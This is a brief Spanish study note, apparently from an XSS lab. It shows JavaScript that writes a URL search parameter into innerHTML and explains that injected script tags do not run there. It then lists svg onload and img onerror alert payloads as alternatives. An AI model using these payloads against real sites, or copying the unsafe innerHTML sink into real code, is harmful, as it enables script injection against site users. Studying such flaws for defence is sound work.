```javascript
function doSearchQuery(query) {
                                document.getElementById('searchMessage').innerHTML = query;
                            }
                            var query = (new URLSearchParams(window.location.search)).get('search');
                            if(query) {
                                doSearchQuery(query);
                            }
```

```html
<span id="searchMessage">PAYLOAD</span>
```

==innerHTML permite la insercción de etiquetas script pero no los ejecuta==

Alternativas : 

```html
<svg onload="alert('XSS')"></svg>
<img src=1 onerror=alert(1)>
```

